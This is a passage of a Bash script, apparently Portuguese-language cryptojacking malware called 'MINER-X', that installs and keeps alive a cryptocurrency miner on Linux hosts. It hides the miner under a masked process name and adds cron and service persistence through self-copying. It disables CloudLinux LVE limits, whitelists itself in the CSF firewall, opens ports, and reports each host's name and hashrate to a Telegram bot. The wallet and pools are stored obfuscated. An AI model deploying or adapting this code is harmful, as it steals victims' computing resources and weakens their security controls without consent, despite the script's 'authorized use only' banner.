        esac
    done
}
launch_miner() { # $1 = threads ; ecoa PID
    local threads="$1" pid
    ( exec -a "$MASK_NAME" "$BIN" --config="$CONFIG_FILE" --no-color -t "$threads" ) >/dev/null 2>&1 &
    pid=$!
    printf '%s' "$pid" > "$PID_FILE" 2>/dev/null || true
    printf '%s' "$pid"
}
stop_miner() {
    local pid
    if [ -f "$PID_FILE" ]; then
        pid=$(cat "$PID_FILE" 2>/dev/null)
        case "$pid" in ''|*[!0-9]*) : ;; *) kill "$pid" 2>/dev/null; esac
        rm -f "$PID_FILE"
    fi
    for pid in $(find_miner_pids 2>/dev/null); do
        kill "$pid" 2>/dev/null
    done
    sleep 2
    for pid in $(find_miner_pids 2>/dev/null); do
        kill -9 "$pid" 2>/dev/null
    done
}
test_pool_connection() {
    local host="$1" port="$2" proto
    if have nc; then
        run_timeout 3 nc -z -w 2 "$host" "$port" 2>/dev/null && return 0
    fi
    run_timeout 3 bash -c "exec 3<>/dev/tcp/$host/$port && exec 3>&-" 2>/dev/null && return 0
    case "$port" in
        443|80)
            proto="http"; [ "$port" = "443" ] && proto="https"
            have curl && run_timeout 3 curl -sk --connect-timeout 2 "${proto}://${host}:${port}" >/dev/null 2>&1 && return 0
            ;;
    esac
    return 1
}
log_has() { # $1 = padrao
    [ -f "$LOG_FILE" ] && tail -n 300 "$LOG_FILE" 2>/dev/null | grep -q "$1" && return 0
    if [ "$INIT" = "systemd" ] && [ "$PROFILE" != "user" ]; then
        have journalctl && journalctl -u "$ARTIFACT" --no-pager -n 300 2>/dev/null | grep -q "$1" && return 0
    fi
    return 1
}
check_mining_ok() { log_has "accepted"; }
check_miner_active() { log_has "new job"; }
was_killed_by_oom() {
    if have dmesg && dmesg 2>/dev/null | tail -200 | grep -qE "Out of memory|Killed process"; then
        return 0
    fi
    if [ "$INIT" = "systemd" ] && have journalctl; then
        journalctl -k --no-pager -n 200 2>/dev/null | grep -qE "Out of memory|Killed process" && return 0
    fi
    return 1
}
next_config() {
    if [ "$USE_TLS" = "true" ]; then
        USE_TLS="false"
    else
        USE_TLS="true"
        POOL_INDEX=$(( (POOL_INDEX + 1) % ${#POOLS[@]} ))
        case "${POOLS[$POOL_INDEX]##*:}" in
            443) USE_TLS="true" ;;
            *)   USE_TLS="false" ;;
        esac
    fi
    save_state
}
wait_for_ready() { # $1=pid $2=deploy|recover ; define LAST_WAIT_KIND
    local pid="$1" mode="$2" elapsed=0
    LAST_WAIT_KIND=""
    while [ "$elapsed" -lt "$WAIT_TIMEOUT" ]; do
        sleep "$CHECK_INTERVAL"
        elapsed=$(( elapsed + CHECK_INTERVAL ))
        kill -0 "$pid" 2>/dev/null || return 1
        if log_has "accepted"; then LAST_WAIT_KIND="share"; return 0; fi
        if [ "$elapsed" -ge 120 ] && log_has "new job"; then
            LAST_WAIT_KIND="job"; return 0
        fi
    done
    return 1
}
heal_miner() { # $1=deploy|recover
    local mode="${1:-recover}" attempt pool host port pid rc
    log "Iniciando recuperacao (${mode})..."
    stop_service
    check_and_fix_firewall
    load_state
    tune_miner
    ensure_binary || { err "Payload indisponivel para recuperacao."; return 1; }
    for (( attempt=1; attempt<=MAX_TRIES; attempt++ )); do
        if [ "$GLOBAL_START_TIME" -gt 0 ] && [ $(( $(date +%s) - GLOBAL_START_TIME )) -gt "$GLOBAL_TIMEOUT" ]; then
            err "Timeout global (${GLOBAL_TIMEOUT}s)."
            return 1
        fi
        pool="${POOLS[$POOL_INDEX]}"
        host="${pool%:*}"; port="${pool##*:}"
        case "$port" in 443) USE_TLS="true" ;; *) USE_TLS="false" ;; esac
        log "Tentativa #${attempt}/${MAX_TRIES}: ${host}:${port} TLS=${USE_TLS} T=${THREADS} L=${LIGHT}"
        open_port "$port"
        if ! test_pool_connection "$host" "$port"; then
            err "Sem conectividade."
            next_config
            continue
        fi
        ok "Conectividade OK."
        generate_config "$pool" "$USE_TLS" "$LIGHT" || { err "Falha ao gerar config."; return 1; }
        pid=$(launch_miner "$THREADS")
        if wait_for_ready "$pid" "$mode"; then
            kill "$pid" 2>/dev/null
            wait "$pid" 2>/dev/null
            sleep 1
            rm -f "$PID_FILE"
            if [ "$LAST_WAIT_KIND" = "share" ]; then
                ok "Share aceito — minerador validado."
            else
                ok "Conexao estavel (jobs recebidos) — instalando servico."
            fi
            if create_service "$THREADS"; then
                sleep 10
                check_mining_ok && ok "Servico persistente recebendo shares." || warn "Servico ativo; aguardando shares."
                return 0
            fi
            err "Falha ao instalar servico."
            return 1
        fi
        kill "$pid" 2>/dev/null
        wait "$pid" 2>/dev/null
        rc=$?
        rm -f "$PID_FILE"
        if was_killed_by_oom; then
            warn "OOM detectado — reduzindo recursos."
            apply_oom_mitigations
            THREADS=1; LIGHT="true"; save_state
        fi
        [ "$rc" -eq 134 ] && { err "Abort por memoria (SIGABRT). Host incompativel."; return 1; }
        warn "Sem share/job em ${WAIT_TIMEOUT}s."
        next_config
    done
    err "Todas as tentativas falharam."
    tg_send "Minerador: falha apos ${MAX_TRIES} tentativas em $(hostname 2>/dev/null)"
    return 1
}
monitor() {
    load_state
    if service_active || [ -n "$(find_miner_pids 2>/dev/null)" ]; then
        if check_mining_ok; then
            log "[$(date '+%F %T')] ativo (share aceito)."
        elif check_miner_active; then
            log "[$(date '+%F %T')] ativo (jobs, aguardando share)."
        else
            log "[$(date '+%F %T')] ativo."
        fi
        maybe_reduce_threads
        tg_maybe_status
        return 0
    fi
    if was_killed_by_oom; then
        warn "OOM detectado; reduzindo threads."
        THREADS=1; LIGHT="true"; save_state
    fi
    err "[$(date '+%F %T')] inativo — recuperando."
    tg_send "Minerador inativo em $(hostname 2>/dev/null) — recuperando"
    heal_miner recover
}
maybe_reduce_threads() {
    [ "$PROFILE" = "root" ] || return 0
    local cores load max t
    cores=$(cpu_count)
    load=$(awk '{print $1}' /proc/loadavg 2>/dev/null)
    case "$load" in ''|*[!0-9.]*) return 0 ;; esac
    max=$(awk -v c="$cores" 'BEGIN {printf "%.2f", c*0.8}')
    if awk -v l="$load" -v m="$max" 'BEGIN {exit !(l>m)}'; then
        load_state
        [ "$THREADS" -le 1 ] && return 0
        t=$(( THREADS / 2 )); [ "$t" -lt 1 ] && t=1
        warn "Carga ${load} > ${max}; threads ${THREADS} -> ${t}."
        THREADS=$t
        save_state
        stop_service
        recreate_with_threads "$THREADS"
    fi
}
recreate_with_threads() {
    local threads="$1" pool host port
    pool="${POOLS[$POOL_INDEX]}"; host="${pool%:*}"; port="${pool##*:}"
    case "$port" in 443) USE_TLS="true" ;; *) USE_TLS="false" ;; esac
    generate_config "$pool" "$USE_TLS" "$LIGHT" && create_service "$threads"
}
tg_send() {
    [ -n "${MX_NO_TG:-}" ] && return 0
    [ -z "$TG_TOKEN" ] || [ -z "$TG_CHAT_ID" ] && return 0
    have curl || return 0
    curl -s --connect-timeout 4 --max-time 10 \
        -X POST "${TG_API}${TG_TOKEN}/sendMessage" \
        --data-urlencode "text=$1" \
        -d "chat_id=${TG_CHAT_ID}" \
        -d "parse_mode=HTML" \
        -d "disable_web_page_preview=true" >/dev/null 2>&1 || true
}
tg_maybe_status() {
    [ -n "$TG_TOKEN" ] || return 0
    local now last hr msg
    now=$(date +%s)
    last=$(state_get TG_LAST 2>/dev/null || echo 0)
    case "$last" in ''|*[!0-9]*) last=0 ;; esac
    [ $(( now - last )) -lt "$TG_REPORT_INTERVAL" ] && return 0
    state_set TG_LAST "$now"
    hr=$(tail -n 50 "$LOG_FILE" 2>/dev/null | grep -o '[0-9.]* H/s' | tail -1)
    msg="Host: $(hostname 2>/dev/null)
Worker: ${WORKER}
Threads: ${THREADS} (light=${LIGHT})
Pool: ${POOLS[$POOL_INDEX]:-?}
Hashrate: ${hr:-N/A}
Estado: ativo"
    tg_send "$msg"
}
CRON_USER_ARG=""
case "${SUDO_USER:-}" in
    ''|root) : ;;
    *) CRON_USER_ARG="-u $SUDO_USER" ;;
esac
cron_installed_line() { # $1 = linha
    crontab $CRON_USER_ARG -l 2>/dev/null | grep -qF "$1"
}
user_cron_add() { # $1 = linha
    local line="$1" cur
    cron_installed_line "$line" && return 0
    cur=$(crontab $CRON_USER_ARG -l 2>/dev/null || true)
    { printf '%s\n' "$cur" | grep -v '^[[:space:]]*$'; printf '%s\n' "$line"; } | crontab $CRON_USER_ARG - 2>/dev/null
}
user_cron_del() { # $1 = padrao
    local cur
    cur=$(crontab $CRON_USER_ARG -l 2>/dev/null || true)
    [ -n "$cur" ] || return 0
    printf '%s\n' "$cur" | grep -vF "$1" | crontab $CRON_USER_ARG - 2>/dev/null || true
}
install_self_copy() {
    local copy="$CRON_HELPER-core"
    mkdir -p "$HELPER_DIR" 2>/dev/null || return 1
    if [ -r "$SELF_PATH" ] && [ "$SELF_PATH" != "$copy" ]; then
        cp -f "$SELF_PATH" "$copy" 2>/dev/null && chmod 700 "$copy" 2>/dev/null
    fi
    [ -r "$copy" ] || copy="$SELF_PATH"
    printf '%s' "$copy"
}
install_cron_monitor() {
    if [ "${MX_NO_CRON:-0}" = "1" ]; then
        info "Cron desabilitado (MX_NO_CRON=1)."
        return 0
    fi
    local target line
    target=$(install_self_copy)
    [ -z "$target" ] && { warn "Nao foi possivel copiar o script p/ o cron."; return 1; }
    line="*/5 * * * * /bin/bash $target monitor >/dev/null 2>&1"
    if [ "$PROFILE" = "user" ]; then
        user_cron_add "$line" && ok "Cron de usuario instalado."
        return 0
    fi
    case "$INIT" in
        openrc)
            mkdir -p /etc/crontabs 2>/dev/null
            if ! grep -qF "$target" /etc/crontabs/root 2>/dev/null; then
                printf '%s\n' "$line" >> /etc/crontabs/root 2>/dev/null
            fi
            chmod 600 /etc/crontabs/root 2>/dev/null
            have rc-service && rc-service crond start >/dev/null 2>&1
            have rc-update && rc-update add crond default >/dev/null 2>&1
            ok "Cron instalado em /etc/crontabs/root."
            ;;
        *)
            mkdir -p /etc/cron.d 2>/dev/null
            cat > "/etc/cron.d/$ARTIFACT" <<EOF
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/5 * * * * root /bin/bash $target monitor >/dev/null 2>&1
EOF
            chmod 644 "/etc/cron.d/$ARTIFACT" 2>/dev/null
            ok "Cron instalado em /etc/cron.d/$ARTIFACT."
            ;;
    esac
    return 0
}
remove_cron_monitor() {
    [ "${MX_NO_CRON:-0}" = "1" ] && return 0
    local copy="$CRON_HELPER-core"
    rm -f "/etc/cron.d/$ARTIFACT" 2>/dev/null
    if [ -f /etc/crontabs/root ]; then
        grep -vF "$copy" /etc/crontabs/root 2>/dev/null > /etc/crontabs/root.tmp && \
            cat /etc/crontabs/root.tmp > /etc/crontabs/root && rm -f /etc/crontabs/root.tmp
    fi
    user_cron_del "$copy"
    user_cron_del "monitor >/dev/null 2>&1"
    rm -f "$copy" 2>/dev/null
    rm -f "$CRON_HELPER" 2>/dev/null
    rmdir "$HELPER_DIR" 2>/dev/null || true
}
clean_crontab() {
    local cur
    [ "${MX_NO_CRON:-0}" = "1" ] && return 0
    [ -z "${LEGACY_CRON_RE:-}" ] && return 0
    cur=$(crontab $CRON_USER_ARG -l 2>/dev/null || true)
    if [ -n "$cur" ] && printf '%s\n' "$cur" | grep -qE "$LEGACY_CRON_RE"; then
        printf '%s\n' "$cur" | grep -vE "$LEGACY_CRON_RE" | crontab $CRON_USER_ARG - 2>/dev/null || true
        info "Entradas antigas de cron removidas."
    fi
}
cmd_to_pkg() {
    local cmd="$1"
    case "$PKG_MANAGER" in
        apt)
            case "$cmd" in
                ip) echo iproute2 ;; pkill) echo procps ;; dig) echo dnsutils ;;
                nc) echo netcat-openbsd ;; socat) echo socat ;; timeout) echo coreutils ;;
                sha256sum) echo coreutils ;; mktemp) echo coreutils ;; *) echo "$cmd" ;;
            esac ;;
        dnf|yum|microdnf)
            case "$cmd" in
                ip) echo iproute ;; pkill) echo procps-ng ;; dig) echo bind-utils ;;
                nc) echo nmap-ncat ;; socat) echo socat ;; timeout) echo coreutils ;;
                sha256sum) echo coreutils ;; mktemp) echo coreutils ;; *) echo "$cmd" ;;
            esac ;;
        pacman)
            case "$cmd" in
                ip) echo iproute2 ;; pkill) echo procps-ng ;; dig) echo bind ;;
                nc) echo gnu-netcat ;; socat) echo socat ;; timeout) echo coreutils ;;
                sha256sum) echo coreutils ;; mktemp) echo coreutils ;; *) echo "$cmd" ;;
            esac ;;
        apk)
            case "$cmd" in
                ip) echo iproute2 ;; pkill) echo procps ;; dig) echo bind-tools ;;
                nc) echo netcat-openbsd ;; socat) echo socat ;; timeout) echo coreutils ;;
                sha256sum) echo coreutils ;; mktemp) echo coreutils ;; *) echo "$cmd" ;;
            esac ;;
        zypper)
            case "$cmd" in
                ip) echo iproute2 ;; pkill) echo procps ;; dig) echo bind-utils ;;
                nc) echo netcat-openbsd ;; socat) echo socat ;; timeout) echo coreutils ;;
                sha256sum) echo coreutils ;; mktemp) echo coreutils ;; *) echo "$cmd" ;;
            esac ;;
        xbps)
            case "$cmd" in
                ip) echo iproute2 ;; pkill) echo procps-ng ;; dig) echo bind-utils ;;
                nc) echo ncat ;; socat) echo socat ;; *) echo "$cmd" ;;
            esac ;;
        pkg)
            case "$cmd" in
                dig) echo bind-tools ;; nc) echo netcat ;; socat) echo socat ;;
                timeout) echo coreutils ;; sha256sum) echo coreutils ;; *) echo "$cmd" ;;
            esac ;;
        *) echo "$cmd" ;;
    esac
}
install_dep() { # $1 = pacote
    local pkg="$1"
    [ -z "$pkg" ] && return 1
    log "Instalando $pkg (${PKG_MANAGER})..."
    case "$PKG_MANAGER" in
        apt)      DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "$pkg" >/dev/null 2>&1 ;;
        dnf)      dnf -y install "$pkg" >/dev/null 2>&1 ;;
        microdnf) microdnf -y install "$pkg" >/dev/null 2>&1 ;;
        yum)      yum -y install "$pkg" >/dev/null 2>&1 ;;
        pacman)   pacman -S --noconfirm --needed "$pkg" >/dev/null 2>&1 ;;
        apk)      apk add --no-cache "$pkg" >/dev/null 2>&1 ;;
        zypper)   zypper -n install "$pkg" >/dev/null 2>&1 ;;
        xbps)     xbps-install -y "$pkg" >/dev/null 2>&1 ;;
        eopkg)    eopkg install -y "$pkg" >/dev/null 2>&1 ;;
        emerge)   emerge --noreplace "$pkg" >/dev/null 2>&1 ;;
        pkg)      pkg install -y "$pkg" >/dev/null 2>&1 ;;
        *) return 1 ;;
    esac
}
check_deps() {
    detect_pkg
    local missing=0 cmd
    for cmd in awk sed grep base64 gzip; do
        if ! have "$cmd"; then
            warn "Dependencia essencial ausente: $cmd"
            if [ -n "$PKG_MANAGER" ] && install_dep "$(cmd_to_pkg "$cmd")" && have "$cmd"; then
                ok "$cmd instalado."
            else
                err "Instale manualmente: $cmd"; missing=1
            fi
        fi
    done
    for cmd in curl wget tar pkill dig nc timeout sha256sum mktemp; do
        if ! have "$cmd" && [ -n "$PKG_MANAGER" ]; then
            install_dep "$(cmd_to_pkg "$cmd")" >/dev/null 2>&1 || true
        fi
    done
    [ "$missing" -eq 1 ] && { err "Dependencias obrigatorias em falta."; return 1; }
    ok "Dependencias verificadas."
    return 0
}
detect_cloudlinux() {
    [ -f /etc/cloudlinux-release ] && return 0
    [ -f /usr/sbin/lvectl ] && return 0
    have lsmod && lsmod 2>/dev/null | grep -q kmodlve && return 0
    return 1
}
disable_lve() {
    [ "$PROFILE" = "root" ] || return 0
    detect_cloudlinux || { info "CloudLinux LVE nao detectado."; return 0; }
    warn "CloudLinux LVE detectado; tentando desativar."
    have service && service lve stop >/dev/null 2>&1
    if have chkconfig; then chkconfig lve off 2>/dev/null; fi
    mkdir -p /etc/modprobe.d 2>/dev/null
    grep -q 'blacklist kmodlve' /etc/modprobe.d/blacklist-lve.conf 2>/dev/null || \
        echo 'blacklist kmodlve' >> /etc/modprobe.d/blacklist-lve.conf
    ok "LVE: regras aplicadas (pode exigir reboot)."
}
whitelist_csf() {
    [ "$PROFILE" = "root" ] || return 0
    have csf || { info "CSF nao detectado."; return 0; }
    [ -f /etc/csf/csf.pignore ] || return 0
    log "CSF detectado; adicionando exclusoes."
    local item
    for item in "exe:$BIN" "cmd:$CRON_HELPER" "file:$CRON_HELPER"; do
        grep -qF "$item" /etc/csf/csf.pignore 2>/dev/null || echo "$item" >> /etc/csf/csf.pignore
    done
    csf -r >/dev/null 2>&1 || true
}
banner() {
    [ "$SILENT" = "true" ] && return 0
    printf '%b' "$C_RED"
    echo "=============================================================="
    echo "  MINER-X v$VERSION  ·  multi-distro · auto-contido"
    echo "  Uso exclusivo em ambientes autorizados"
    echo "=============================================================="
    printf '%b' "$C_NC"
}
deploy() {
    banner
    GLOBAL_START_TIME=$(date +%s)
    init_identity || return 1
    apply_paths
    load_state
    WORKER=$(get_worker_id)
    state_set WORKER "$WORKER"
    info "Distro: ${DISTRO_ID} ${DISTRO_VERSION} (familia ${DISTRO_FAMILY})"
    info "Init: ${INIT} | Pkg: ${PKG_MANAGER:-n/d} | Arch: ${ARCH}"
    info "Artefatos: ${ARTIFACT} / ${BIN_NAME} / mask ${MASK_NAME}"
    check_deps || return 1
    if [ "$PROFILE" = "root" ]; then
        snapshot_firewall
        disable_lve
        whitelist_csf
    fi
    clean_crontab
    ensure_binary || return 1
    info "Engine: $(run_timeout 5 "$BIN" --version 2>&1 | head -1)"
    [ "$HOST_TUNING" = "true" ] && apply_oom_mitigations
    setup_swap
    check_min_memory || return 1
    setup_msr
    setup_cpu_governor
    setup_huge_pages
    setup_1gb_hugepages
    setup_tmpfs_cache
    resolve_pools_bypass_hosts
    order_pools_by_latency
    POOL_INDEX=0
    USE_TLS="true"
    tune_miner
    save_state
    heal_miner deploy || {
        err "Falha no deploy."
        return 1
    }
    install_cron_monitor
    [ "$SILENT" = "true" ] && {
        printf '%b[+] ativo — share aceito/estavel%b\n' "$C_GREEN" "$C_NC"
        return 0
    }
    ok "Deploy concluido."
    info "Worker: ${WORKER} | Threads: ${THREADS} | Light: ${LIGHT}"
    info "Pool: ${POOLS[$POOL_INDEX]:-?}"
    info "Servico: ${ARTIFACT} | Binario: ${BIN}"
    return 0
}
status() {
    load_state
    local cur_pool cfg_pool
    WORKER=${WORKER:-$(state_get WORKER 2>/dev/null)}
    cur_pool="${POOLS[$POOL_INDEX]:-?}"
    if [ -r "$CONFIG_FILE" ]; then
        cfg_pool=$(awk -F'"' '/"url"/ {print $4; exit}' "$CONFIG_FILE" 2>/dev/null)
        [ -n "$cfg_pool" ] && cur_pool="$cfg_pool"
    fi
    echo ""
    echo "=== MINER-X v$VERSION ==="
    echo "Distro:  ${DISTRO_ID} ${DISTRO_VERSION} (${DISTRO_FAMILY})"
    echo "Init:    ${INIT} | Pkg: ${PKG_MANAGER:-n/d} | Arch: ${ARCH}"
    if [ -z "$ARTIFACT" ] || [ ! -f "$STATE_FILE" ]; then
        echo "Estado:  nao instalado"
        return 0
    fi
    echo "Worker:  ${WORKER}"
    echo "Threads: ${THREADS} | Light: ${LIGHT}"
    echo "Pool:    ${cur_pool} | TLS: ${USE_TLS}"
    echo "Servico: ${ARTIFACT} ($(service_active && echo ATIVO || echo PARADO))"
    if [ -n "$(find_miner_pids 2>/dev/null)" ]; then
        echo "Processo: RODANDO ($(find_miner_pids | tr '\n' ' '))"
    else
        echo "Processo: PARADO"
    fi
    check_mining_ok && echo "Shares:  ACEITOS" || echo "Shares:  nao detectados"
    echo ""
    echo "Ultimas linhas:"
    tail -n 5 "$LOG_FILE" 2>/dev/null | sed 's/^/  /'
    echo ""
}
self_destruct() {
    banner
    local installed="${MX_WAS_INSTALLED:-0}"
    load_state
    tg_send "Minerador removido de $(hostname 2>/dev/null)"
    warn "Removendo minerador..."
    remove_service
    stop_miner
    remove_cron_monitor
    rm -f "$BIN" "$CONFIG_FILE" "$LOG_FILE" "$PID_FILE" 2>/dev/null
    rm -rf "$CONFIG_DIR" 2>/dev/null
    if [ "$PROFILE" = "user" ]; then
        rm -rf "$LOG_DIR" 2>/dev/null
    fi
    if [ "$(state_get CREATED_SWAP 2>/dev/null)" = "true" ] && [ -f "$SWAPFILE" ]; then
        have swapoff && swapoff "$SWAPFILE" 2>/dev/null
        sed_inplace "\|$SWAPFILE|d" /etc/fstab 2>/dev/null
        rm -f "$SWAPFILE" 2>/dev/null
    fi
    if [ "$(state_get CREATED_SYSCTL 2>/dev/null)" = "true" ] && [ -n "${SYSCTL_FILE:-}" ]; then
        rm -f "$SYSCTL_FILE" 2>/dev/null
    fi
    host_restore_old
    umount /dev/shm/.cache 2>/dev/null || true
    rm -rf /dev/shm/.cache 2>/dev/null || true
    if [ -n "${LEGACY_PATHS:-}" ]; then
        local lp
        for lp in $LEGACY_PATHS; do rm -f "$lp" 2>/dev/null || true; done
    fi
    if [ "$installed" -eq 1 ]; then
        rm -rf "$MX_STATE_DIR" 2>/dev/null
        case "$SELF_PATH" in
            /dev/fd/*|/proc/*|bash|sh|'') : ;;
            *) [ -f "$SELF_PATH" ] && rm -f "$SELF_PATH" 2>/dev/null ;;
        esac
    else
        rm -rf "$MX_STATE_DIR" 2>/dev/null
        warn "Nenhuma instalacao encontrada (apenas artefatos legados limpos)."
    fi
    ok "Remocao concluida."
}
ST_PASS=0
ST_FAIL=0
st_ok()   { ST_PASS=$((ST_PASS+1)); printf '[PASS] %s\n' "$1"; }
st_bad()  { ST_FAIL=$((ST_FAIL+1)); printf '[FAIL] %s\n' "$1"; }
st_check(){ # $1=desc, $2=comando
    if eval "$2" >/dev/null 2>&1; then st_ok "$1"; else st_bad "$1"; fi
}
selftest() {
    echo "=== SELFTEST MINER-X v$VERSION ==="
    detect_distro; detect_pkg; detect_init; detect_arch
    echo "distro=${DISTRO_ID} ${DISTRO_VERSION} familia=${DISTRO_FAMILY} init=${INIT} pkg=${PKG_MANAGER:-n/d} arch=${ARCH}"
    echo "bash=${BASH_VERSION}"
    echo ""
    st_check "base64 roundtrip" 'printf aGVsbG8= | b64_decode | grep -qx hello'
    st_check "rot47 auto-inverso" '[ "$(printf "Hello" | _rot47 | _rot47)" = "Hello" ]'
    st_check "literal wallet decodifica" '[ "${#WALLET}" -eq 95 ] && [ "${WALLET:0:1}" = "4" ]'
    st_check "pools decodificadas" '[ "${#POOLS[@]}" -ge 1 ]'
    st_check "now_ms numerico" 'case "$(now_ms)" in ""|*[!0-9]*) false ;; *) true ;; esac'
    st_check "mem_total_mb" '[ "$(mem_total_mb)" -gt 0 ]'
    st_check "cpu_count" '[ "$(cpu_count)" -ge 1 ]'
    st_check "sed_inplace" 'f=/tmp/mxst.$$; echo a > $f; sed_inplace "s/a/b/" $f; grep -qx b $f; rm -f $f'
    st_check "state set/get" '
        d=/tmp/mxstate.$$; mkdir -p $d; old=$STATE_FILE; oldd=$MX_STATE_DIR
        MX_STATE_DIR=$d; STATE_FILE=$d/state
        state_set K V && [ "$(state_get K)" = "V" ]
        rc=$?; rm -rf $d; MX_STATE_DIR=$oldd; STATE_FILE=$old
        [ $rc -eq 0 ]'
    st_check "sha256_of ou openssl" '[ -n "$(sha256_of /etc/hostname 2>/dev/null)" ] || have openssl'
    st_check "gzip disponivel" 'have gzip || have busybox'
    if payload_available "$ARCH"; then
        st_ok "payload embutido p/ $ARCH"
        local _d
        _d=$(mktemp -d "${TMPDIR:-/tmp}/mxst.XXXXXX" 2>/dev/null)
        if [ -n "$_d" ] && payload_extract "$_d/engine"; then
            st_ok "extracao + checksum do payload"
        else
            st_bad "extracao + checksum do payload"
        fi
        rm -rf "$_d" 2>/dev/null
    else
        printf '[INFO] sem payload embutido para %s (use build.sh)\n' "$ARCH"
    fi
    st_check "init detectado" 'case "$INIT" in systemd|openrc|sysv) true ;; *) false ;; esac'
    echo ""
    echo "Ferramentas: curl=$(have curl && echo y || echo n) wget=$(have wget && echo y || echo n) tar=$(have tar && echo y || echo n) dig=$(have dig && echo y || echo n) nc=$(have nc && echo y || echo n) sha256sum=$(have sha256sum && echo y || echo n) journalctl=$(have journalctl && echo y || echo n)"
    echo ""
    echo "PASS=${ST_PASS} FAIL=${ST_FAIL}"
    [ "$ST_FAIL" -eq 0 ]
}
usage() {
    cat <<EOF
MINER-X v${VERSION}
Uso: $0 [flags] <comando>
Comandos:
  deploy      instala/atualiza e inicia
  monitor     verifica saude e recupera (cron)
  heal        recupera manualmente
  status      mostra estado
  firewall    verifica/ajusta firewall
  uninstall   remove tudo
  selftest    diagnostico de compatibilidade
Flags:
  --silent            saida minima
  --user              perfil de usuario (sem root)
  --no-host-tuning    nao altera sysctl/governor/hugepages
  --allow-download    baixa payload se nao houver embutido
  --version | --help
Exemplos:
  sudo ./miner.sh deploy
  sudo ./miner.sh --silent deploy
  ./miner.sh --user deploy
EOF
}
main() {
    local -a args=()
    local a
    for a in "$@"; do
        case "$a" in
            --silent)         SILENT=true ;;
            --user)           PROFILE="user" ;;
            --root)           PROFILE="root" ;;
            --no-host-tuning) HOST_TUNING=false ;;
            --allow-download) ALLOW_DOWNLOAD=true ;;
            -v|--version)     echo "MINER-X v$VERSION"; return 0 ;;
            -h|--help|help)   usage; return 0 ;;
            *)                args+=("$a") ;;
        esac
    done
    detect_distro; detect_pkg; detect_init; detect_arch
    resolve_self
    load_config_literals
    init_state_dir
    local cmd="${args[0]:-}"
    case "$cmd" in
        deploy|monitor|heal|status|firewall|uninstall|selftest) ;;
        '') usage; return 0 ;;
        *) err "Comando desconhecido: $cmd"; usage; return 1 ;;
    esac
    case "$cmd" in
        deploy|monitor|heal)
            if [ -z "${WALLET:-}" ]; then
                err "wallet ausente: defina MX_WALLET ou preencha config/mx.env"
                err "template: config/mx.env.example"
                return 1
            fi
            ;;
    esac
    if [ "$cmd" != "selftest" ] && [ "$cmd" != "status" ] && [ "$PROFILE" = "root" ] && [ "$EUID" -ne 0 ]; then
        err "Este comando requer root (use sudo) ou --user."
        return 1
    fi
    if [ "$cmd" = "selftest" ]; then
        selftest
        return $?
    fi
    if [ "$cmd" = "status" ]; then
        if [ -f "$STATE_FILE" ]; then
            init_identity || return 1
            apply_paths
            load_state
        fi
        status
        return $?
    fi
    MX_WAS_INSTALLED=0
    [ -f "$STATE_FILE" ] && MX_WAS_INSTALLED=1
    init_identity || return 1
    apply_paths
    load_state
    WORKER=$(state_get WORKER 2>/dev/null)
    if [ -z "$WORKER" ]; then
        WORKER=$(get_worker_id)
        state_set WORKER "$WORKER"
    fi
    case "$cmd" in
        deploy)    deploy ;;
        monitor)   monitor ;;
        heal)      heal_miner recover ;;
        status)    status ;;
        firewall)  check_and_fix_firewall ;;
        uninstall) self_destruct ;;
    esac
}
if [ "${MX_LIB_ONLY:-0}" = "1" ]; then
    return 0 2>/dev/null || exit 0
fi
main "$@"
